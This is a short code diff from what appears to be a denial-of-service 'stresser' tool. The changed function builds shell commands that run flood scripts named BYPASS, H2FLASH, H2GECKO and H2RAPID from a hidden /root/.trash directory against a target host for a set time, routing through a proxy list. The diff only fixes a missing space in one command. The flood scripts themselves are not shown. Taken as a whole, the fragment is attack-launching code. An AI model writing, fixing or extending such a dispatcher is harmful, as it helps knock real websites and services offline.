@@ -41,7 +41,7 @@ const generateCommand = (method, host, port, time) => {
         case 'BYPASS':
             return `cd /root/.trash && node BYPASS.js ${host} ${time} 8 2 proxy.txt`;
         case 'H2FLASH':
-            return `cd /root/.trash && node H2FLASH.js ${host} ${time} 8 8proxy.txt`;
+            return `cd /root/.trash && node H2FLASH.js ${host} ${time} 8 8 proxy.txt`;
         case 'H2GECKO':
             return `cd /root/.trash && node H2GECKO.js ${host} ${time} 32 2 proxy.txt`;
         case 'H2RAPID':
